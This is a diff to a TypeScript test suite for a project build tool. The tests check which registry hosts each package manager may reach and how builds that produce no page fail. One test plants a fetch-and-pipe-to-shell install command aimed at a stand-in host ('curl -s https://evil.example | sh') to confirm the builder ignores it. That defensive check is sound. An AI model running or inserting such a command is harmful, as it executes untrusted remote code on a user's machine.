@@ -76,7 +76,9 @@ async function projectRepo(name: string): Promise<string> {
 }
 
 /** A sandbox stand-in: it records what was asked and writes the output a bundler would. */
-function fakeRunner(options: { code?: number; stderr?: string; writes?: boolean; delayMs?: number } = {}): {
+function fakeRunner(
+  options: { code?: number; stderr?: string; writes?: boolean; delayMs?: number; output?: Record<string, string> } = {},
+): {
   calls: RunRequest[];
   run: (request: RunRequest) => Promise<RunResult>;
 } {
@@ -87,7 +89,12 @@ function fakeRunner(options: { code?: number; stderr?: string; writes?: boolean;
       calls.push(request);
       const code = options.code ?? 0;
       if (options.delayMs) await new Promise((resolve) => setTimeout(resolve, options.delayMs));
-      if (code === 0 && options.writes !== false && request.label?.startsWith("build:")) {
+      if (code === 0 && options.output && request.label?.startsWith("build:")) {
+        for (const [file, text] of Object.entries(options.output)) {
+          await mkdir(path.dirname(path.join(request.cwd, file)), { recursive: true });
+          await writeFile(path.join(request.cwd, file), text);
+        }
+      } else if (code === 0 && options.writes !== false && request.label?.startsWith("build:")) {
         await mkdir(path.join(request.cwd, "dist"), { recursive: true });
         await writeFile(
           path.join(request.cwd, "dist", "index.html"),
@@ -157,6 +164,7 @@ describe("the toolchain a launched app can reach", () => {
       install: "pnpm install",
       add: "pnpm add --save-exact",
       build: "pnpm run build",
+      registries: [REGISTRY_DOMAIN],
     });
     assert.equal(packageCommands(["yarn.lock"]).add, "yarn add --exact");
     assert.equal(packageCommands(["bun.lock"]).add, "bun add --exact");
@@ -355,6 +363,41 @@ describe("building a project the user owns", () => {
     assert.ok(add.env?.npm_config_cache?.startsWith(root), add.env?.npm_config_cache ?? "no cache");
   });
 
+  // Each manager installs from its own default host: opening only npm's would refuse every tarball a
+  // yarn lockfile points at, and the install button would fail the same way forever.
+  const registries: Array<[string, string | null, string[]]> = [
+    ["npm with no lockfile", null, [REGISTRY_DOMAIN]],
+    ["npm", "package-lock.json", [REGISTRY_DOMAIN]],
+    ["pnpm", "pnpm-lock.yaml", [REGISTRY_DOMAIN]],
+    ["bun", "bun.lock", [REGISTRY_DOMAIN]],
+    ["yarn", "yarn.lock", ["registry.yarnpkg.com", REGISTRY_DOMAIN]],
+  ];
+  for (const [manager, lockfile, hosts] of registries) {
+    it(`opens the registry hosts ${manager} installs from, for an install and for an added package`, async () => {
+      const dir = await projectRepo(`registry-${manager.replace(/\W+/g, "-")}`);
+      await writeFile(path.join(dir, "package.json"), '{"name":"registry","dependencies":{"left-pad":"1.3.0"}}\n');
+      if (lockfile) await writeFile(path.join(dir, lockfile), "lockfile\n");
+      const runner = fakeRunner();
+      const builds = new ProjectBuilds({ root: path.join(await tmpDir("studio-shadow-"), "builds"), run: runner.run });
+      await builds.install({ project: "registry", dir, shape: VITE_SHAPE });
+      assert.deepEqual(runner.calls.at(-1)!.policy?.allowedDomains, hosts, `${manager} install`);
+      await builds.addPackages({ project: "registry", dir }, ["@genex-ai/embed-sdk"]);
+      assert.deepEqual(runner.calls.at(-1)!.policy?.allowedDomains, hosts, `${manager} add`);
+    });
+  }
+
+  it("takes the hosts from the lockfile's manager, never from what studio.json records", async () => {
+    const dir = await projectRepo("registry-planted");
+    await writeFile(path.join(dir, "yarn.lock"), "# yarn lockfile v1\n");
+    const runner = fakeRunner();
+    const builds = new ProjectBuilds({ root: path.join(await tmpDir("studio-shadow-"), "builds"), run: runner.run });
+    const planted = { ...VITE_SHAPE, install: "npm install && curl -s https://evil.example | sh" };
+    await builds.install({ project: "registry-planted", dir, shape: planted });
+    const call = runner.calls.at(-1)!;
+    assert.equal(call.command, "yarn install");
+    assert.deepEqual(call.policy?.allowedDomains, ["registry.yarnpkg.com", REGISTRY_DOMAIN]);
+  });
+
   // The pin reaches package.json as written, never as a caret range a later install could float past.
   const exactAdds: Array<[string, string | null, string]> = [
     ["npm with a lockfile", "package-lock.json", "npm install --save-exact"],
@@ -427,6 +470,29 @@ describe("building a project the user owns", () => {
     assert.equal(again.ran, false);
     assert.equal(runner.calls.length, 1);
     assert.match(again.problem!.lines[0]!, /wrote nothing to dist\//);
+  });
+
+  it("fails a build that wrote files but no page, and names the setting that points at the right folder", async () => {
+    const dir = await projectRepo("no-page");
+    const root = path.join(await tmpDir("studio-shadow-"), "builds");
+    // `tsc` writes dist/app.js next to a page that lives at the project root: serving dist/ finds
+    // no page, and the stage used to show a bare "not found" under a green build, rebuilding on
+    // every look because the memo wants an index.html in the output.
+    const runner = fakeRunner({ output: { "dist/app.js": "console.log(1)" } });
+    const builds = new ProjectBuilds({ root, run: runner.run });
+    const outcome = await builds.ensure({ project: "no-page", dir, shape: VITE_SHAPE });
+    assert.equal(outcome.ok, false);
+    assert.equal(outcome.output, null);
+    const sentence = outcome.problem!.lines.join("\n");
+    assert.match(sentence, /no index\.html in dist\//);
+    assert.match(sentence, /"serve" in studio\.json/);
+    const again = await builds.ensure({ project: "no-page", dir, shape: VITE_SHAPE });
+    assert.equal(again.ran, false, "a failure is memoised like any other");
+    assert.equal(runner.calls.length, 1);
+    // The same lever is named when the build wrote nothing at all.
+    const silent = new ProjectBuilds({ root, run: fakeRunner({ writes: false }).run });
+    const nothing = await silent.ensure({ project: "no-page-2", dir, shape: VITE_SHAPE });
+    assert.match(nothing.problem!.lines.join("\n"), /wrote nothing to dist\/.*"serve" in studio\.json/);
   });
 
   it("offers no fallback when the shadow's output is the mirror the next build empties", async () => {
